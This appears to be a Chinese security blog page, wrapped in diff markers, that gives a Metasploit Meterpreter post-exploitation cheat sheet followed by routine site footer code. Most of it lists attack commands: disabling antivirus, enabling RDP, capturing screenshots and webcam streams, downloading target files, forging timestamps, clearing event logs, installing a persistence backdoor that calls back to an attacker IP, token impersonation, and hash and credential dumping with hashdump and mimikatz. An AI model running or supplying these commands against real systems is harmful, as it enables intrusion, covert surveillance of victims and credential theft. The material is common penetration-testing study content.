+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT -Pn -p 80,445 192.168.80.127</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Meterpreter命令"><a href="#Meterpreter命令" class="headerlink" title="Meterpreter命令"></a>Meterpreter命令</h2><h4 id="获取正在运行的进程"><a href="#获取正在运行的进程" class="headerlink" title="获取正在运行的进程"></a>获取正在运行的进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br></pre></td></tr></table></figure>
+
+<h4 id="查看Meterpreter-shell的进程号"><a href="#查看Meterpreter-shell的进程号" class="headerlink" title="查看Meterpreter shell的进程号"></a>查看Meterpreter shell的进程号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getpid</span><br></pre></td></tr></table></figure>
+
+<h4 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate [要迁移的进程号]</span><br></pre></td></tr></table></figure>
+
+<h4 id="自动迁移进程"><a href="#自动迁移进程" class="headerlink" title="自动迁移进程"></a>自动迁移进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;migrate</span><br></pre></td></tr></table></figure>
+
+<h4 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a>查看系统信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure>
+
+<h4 id="查看是否为虚拟机"><a href="#查看是否为虚拟机" class="headerlink" title="查看是否为虚拟机"></a>查看是否为虚拟机</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;checkvm</span><br></pre></td></tr></table></figure>
+
+<h4 id="查看运行时间"><a href="#查看运行时间" class="headerlink" title="查看运行时间"></a>查看运行时间</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idletime</span><br></pre></td></tr></table></figure>
+
+<h4 id="查看完整的网络设置"><a href="#查看完整的网络设置" class="headerlink" title="查看完整的网络设置"></a>查看完整的网络设置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route</span><br></pre></td></tr></table></figure>
+
+<h4 id="查看权限"><a href="#查看权限" class="headerlink" title="查看权限"></a>查看权限</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br></pre></td></tr></table></figure>
+
+<h4 id="关闭杀毒软件"><a href="#关闭杀毒软件" class="headerlink" title="关闭杀毒软件"></a>关闭杀毒软件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;killav</span><br></pre></td></tr></table></figure>
+
+<h4 id="启动远程桌面"><a href="#启动远程桌面" class="headerlink" title="启动远程桌面"></a>启动远程桌面</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</span><br></pre></td></tr></table></figure>
+
+<h4 id="查看网络结构"><a href="#查看网络结构" class="headerlink" title="查看网络结构"></a>查看网络结构</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;autoroute</span><br></pre></td></tr></table></figure>
+
+<h4 id="列举当前多少用户登录了目标机"><a href="#列举当前多少用户登录了目标机" class="headerlink" title="列举当前多少用户登录了目标机"></a>列举当前多少用户登录了目标机</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_logged_on_users </span><br></pre></td></tr></table></figure>
+
+<h4 id="列举应用程序"><a href="#列举应用程序" class="headerlink" title="列举应用程序"></a>列举应用程序</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_applications</span><br></pre></td></tr></table></figure>
+
+<h4 id="抓取自动登录的用户名和密码"><a href="#抓取自动登录的用户名和密码" class="headerlink" title="抓取自动登录的用户名和密码"></a>抓取自动登录的用户名和密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run windows&#x2F;gather&#x2F;credentials&#x2F;windows_autologin</span><br></pre></td></tr></table></figure>
+
+<h4 id="抓取屏幕截图"><a href="#抓取屏幕截图" class="headerlink" title="抓取屏幕截图"></a>抓取屏幕截图</h4><ul>
+<li>需要先加载扩展插件expia，然后再执行</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load espia</span><br><span class="line">screengrab</span><br></pre></td></tr></table></figure>
+
+<h4 id="查看目标有没有摄像头"><a href="#查看目标有没有摄像头" class="headerlink" title="查看目标有没有摄像头"></a>查看目标有没有摄像头</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webcam_list</span><br></pre></td></tr></table></figure>
+
+<h4 id="抓取摄像头的图片"><a href="#抓取摄像头的图片" class="headerlink" title="抓取摄像头的图片"></a>抓取摄像头的图片</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webcam_snap</span><br></pre></td></tr></table></figure>
+
+<h4 id="开启直播模式"><a href="#开启直播模式" class="headerlink" title="开启直播模式"></a>开启直播模式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webcam_stream</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>用浏览器打开上面的地址</li>
+</ul>
+<h4 id="进入目标机shell"><a href="#进入目标机shell" class="headerlink" title="进入目标机shell"></a>进入目标机shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
+
+<h3 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h3><h4 id="查看当前处于哪个目录"><a href="#查看当前处于哪个目录" class="headerlink" title="查看当前处于哪个目录"></a>查看当前处于哪个目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwd  &#x2F;&#x2F;下面的命令同样效果</span><br><span class="line">getwd</span><br></pre></td></tr></table></figure>
+
+<h4 id="查看当前处于本地的哪个目录"><a href="#查看当前处于本地的哪个目录" class="headerlink" title="查看当前处于本地的哪个目录"></a>查看当前处于本地的哪个目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getlwd</span><br></pre></td></tr></table></figure>
+
+<h4 id="切换目录"><a href="#切换目录" class="headerlink" title="切换目录"></a>切换目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd c:&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h4 id="搜索文件"><a href="#搜索文件" class="headerlink" title="搜索文件"></a>搜索文件</h4><ul>
+<li>搜索C盘所有以.txt扩展名文件</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search -f *.txt -d c:&#x2F;  </span><br></pre></td></tr></table></figure>
+
+<h4 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h4><ul>
+<li>下载目标机C盘的test.txt文件到攻击机root下</li>
+<li>如果指定的是一个文件夹，会把文件夹内的所有文件下载下来，不包括那个文件夹</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download c:&#x2F;test.txt &#x2F;root </span><br></pre></td></tr></table></figure>
+
+<h4 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h4><ul>
+<li><p>上传本地root文件到目标机的C盘下</p>
+</li>
+<li><p>如果指定的是一个文件夹，会把文件夹内的所有文件上传上去，不包括那个文件夹</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload &#x2F;root&#x2F;test.txt c:&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h4 id="执行文件"><a href="#执行文件" class="headerlink" title="执行文件"></a>执行文件</h4><ul>
+<li>创建新进程cmd.exe，-H不可见，-i交互</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execute -H -i -f cmd.exe</span><br></pre></td></tr></table></figure>
+
+<h4 id="伪造时间戳"><a href="#伪造时间戳" class="headerlink" title="伪造时间戳"></a>伪造时间戳</h4><ul>
+<li>查看帮助</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timestomp C:&#x2F;&#x2F; -h</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查看时间戳</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timestomp -v C:&#x2F;&#x2F;2.txt</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将1.txt的时间戳复制给2.txt</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timestomp C:&#x2F;&#x2F;2.txt -f C:&#x2F;&#x2F;1.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="清除日志"><a href="#清除日志" class="headerlink" title="清除日志"></a>清除日志</h4><ul>
+<li>winodws查看事件日志：右键“我的电脑”，选择管理，打开「事件查看器」；或者同时按下 Windows键 + R键，输入“eventvwr.msc”直接打开「事件查看器」。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clearev</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h3><ul>
+<li>查看路由信息</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>手动添加路由</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s ip&#x2F;24</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>自动添加路由</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;multi&#x2F;manage&#x2F;autoroute</span><br></pre></td></tr></table></figure>
+
+<h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><ul>
+<li>将目标机的端口3389转发到本地端口6666</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l 6666 -p 3389 -r 192.168.80.135</span><br></pre></td></tr></table></figure>
+
+<h3 id="留后门"><a href="#留后门" class="headerlink" title="留后门"></a>留后门</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run persistence -A -S -U -i 5 -p 8899 -r 192.168.80.127</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="进入目标机的cmd"><a href="#进入目标机的cmd" class="headerlink" title="进入目标机的cmd"></a>进入目标机的cmd</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
+
+<h4 id="编号设置为UTF"><a href="#编号设置为UTF" class="headerlink" title="编号设置为UTF"></a>编号设置为UTF</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chcp 65001</span><br></pre></td></tr></table></figure>
+
+<h4 id="查看当前权限"><a href="#查看当前权限" class="headerlink" title="查看当前权限"></a>查看当前权限</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami&#x2F;groups</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>标准用户：Mandatory Label\Medium Mandatory Level Label</li>
+<li>管理员：Mandatory Label\High Mandatory Level Label</li>
+</ul>
+<h4 id="查看系统的已打补丁"><a href="#查看系统的已打补丁" class="headerlink" title="查看系统的已打补丁"></a>查看系统的已打补丁</h4><ul>
+<li>Hotfix(s):为修补程序</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>或者查询C:\windows\里留下的补丁号”.log”</li>
+</ul>
+<h4 id="Wmic查看系统补丁"><a href="#Wmic查看系统补丁" class="headerlink" title="Wmic查看系统补丁"></a>Wmic查看系统补丁</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="meterpreter提权"><a href="#meterpreter提权" class="headerlink" title="meterpreter提权"></a>meterpreter提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; getsystem</span><br></pre></td></tr></table></figure>
+
+<h4 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h4><p>使用token</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br></pre></td></tr></table></figure>
+
+<p>列出可用的token</p>
+<ul>
+<li>令牌类型<ul>
+<li>Delegation Tokens          授权令牌</li>
+<li>Impersonation                 模拟令牌</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list_tokens -u</span><br></pre></td></tr></table></figure>
+
+<p>如果获取的列表里面有管理员令牌，调用impersonate_token命令假冒Administrator用户进行攻击</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impersonate_token WIN-57TJ4B561MT\\Administrator</span><br></pre></td></tr></table></figure>
+
+<h4 id="获取哈希值"><a href="#获取哈希值" class="headerlink" title="获取哈希值"></a>获取哈希值</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在非system权限下运行hashdump命令会失败，而且在windows 7、windows Server 2008下有时候会出现进程移植不成功等问题；而另一个模块smart_hashdump的功能更强大，可以导出所有域用户的hash</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run windows&#x2F;gather&#x2F;smart_hashdump</span><br></pre></td></tr></table></figure>
+
+<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p>加载mimikatz模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz</span><br></pre></td></tr></table></figure>
+
+<p>查看帮助</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">help mimikatz</span><br></pre></td></tr></table></figure>
+
+<p>抓取hash</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msv</span><br></pre></td></tr></table></figure>
+
+<p>查看全部功能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz_command -f a::</span><br></pre></td></tr></table></figure>
+
+<p>抓取hash</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz_command -f samdump::hashes</span><br></pre></td></tr></table></figure>
+
+
+
+<p>——   参考来源《Web安全攻防》</p>
+
+      
+    </div>
+    <div class="article-footer">
+      
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2021/03/10/%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" title="通达OA未授权访问漏洞"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2021/01/05/tamper%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87/" title="tamper 安全狗的绕过"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    
+  </div>
+  </div>
+</nav>
+  
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/noevery" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        &copy; 2022 John Doe
+        
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+<!-- custom analytics part create by xiamo -->
+<script defer src="https://cdn1.lncld.net/static/js/av-min-1.2.1.js"></script>
+<script defer>
+AV.init({
+  appId: '',
+  appKey: ''
+});
+
+function showTime(Counter) {
+	var query = new AV.Query(Counter);
+		var visitors= $('.leancloud_visitors');
+		query.greaterThanOrEqualTo("time", 0);		
+		query.find({
+			success: function(results) {
+				if (results.length == 0) {				
+					return;
+				}
+				var data = results;
+				visitors.each(function(){
+					var url = $(this).attr('id').trim();					
+					for (var i = 0; i < data.length; i++) {
+						var object = data[i];
+						var content = object.get('time');
+						var _url = object.get('url')
+						if(url == _url){
+							$(this).text(content);
+						}
+					}
+				})
+				
+			},
+			error: function(object, error) {
+				console.log("Error: " + error.code + " " + error.message);
+			}
+		});
+}
+
+function addCount(Counter) {
+	var Counter = AV.Object.extend("Counter");
+	url = $(".leancloud_visitors").attr('id').trim();
+	title = $(".leancloud_visitors").attr('data-flag-title').trim();
+	var query = new AV.Query(Counter);
+	query.equalTo("url", url);
+	query.find({
+		success: function(results) {
+			if (results.length > 0) {
+				var counter = results[0];
+				counter.fetchWhenSave(true);
+				counter.increment("time");
+				counter.save(null, {
+					success: function(counter) {
+						var content = counter.get('time');
+						$(document.getElementById(url)).text(content);
+					},
+					error: function(counter, error) {
+						console.log('Failed to save Visitor num, with error message: ' + error.message);
+					}
+				});
+			} else {
+				var newcounter = new Counter();
+				newcounter.set("title", title);
+				newcounter.set("url", url);
+				newcounter.set("time", 1);
+				newcounter.save(null, {
+					success: function(newcounter) {
+					    console.log("newcounter.get('time')="+newcounter.get('time'));
+						var content = newcounter.get('time');
+						$(document.getElementById(url)).text(content);
+					},
+					error: function(newcounter, error) {
+						console.log('Failed to create');
+					}
+				});
+			}
+		},
+		error: function(error) {
+			console.log('Error:' + error.code + " " + error.message);
+		}
+	});
+}
+$(function() {
+	var Counter = AV.Object.extend("Counter");
+	if ($('.leancloud_visitors').length == 1) {
+		addCount(Counter);
+	} else {
+		showTime(Counter);
+	}
+}); 
+</script>
+
+
+
+   
+
+
+
+
+
+
+</body>
+</html>
